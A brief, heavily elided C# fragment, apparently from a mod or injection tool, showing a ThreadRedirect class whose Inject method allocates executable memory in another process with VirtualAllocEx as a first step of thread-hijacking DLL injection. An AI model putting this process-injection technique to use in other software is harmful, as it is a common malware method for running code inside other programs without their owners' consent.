...
using System.Linq;
using static ShadowMod.NativeMethods;
using ShadowMod;
...
public class ThreadRedirect
{
    public static int Inject(IntPtr hProcess, IntPtr hThread, string dllName)
    {
        ...
        IntPtr allocMemAddress = VirtualAllocEx(hProcess, IntPtr.Zero, ((payload.Length + 1) * Marshal.SizeOf(typeof(char))), AllocationType.MEM_COMMIT | AllocationType.MEM_RESERVE, MemoryProtection.PAGE_EXECUTE_READWRITE);
